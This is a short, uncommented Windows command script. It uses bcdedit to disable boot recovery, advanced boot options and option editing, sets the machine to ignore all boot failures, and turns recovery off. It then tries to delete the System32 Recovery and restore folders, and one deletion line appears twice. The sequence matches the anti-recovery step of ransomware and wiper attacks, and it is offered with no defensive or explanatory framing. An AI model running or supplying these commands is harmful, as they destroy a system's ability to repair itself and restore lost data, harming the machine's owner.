bcdedit /set {current} bootems no 
bcdedit /set {current} advancedoptions off 
bcdedit /set {current} optionsedit off 
bcdedit /set {current} bootstatuspolicy IgnoreAllFailures 
bcdedit /set {current} recoveryenabled off
del C:\Windows\System32\Recovery\
del C:\Windows\System32\restore\
del C:\Windows\System32\Recovery\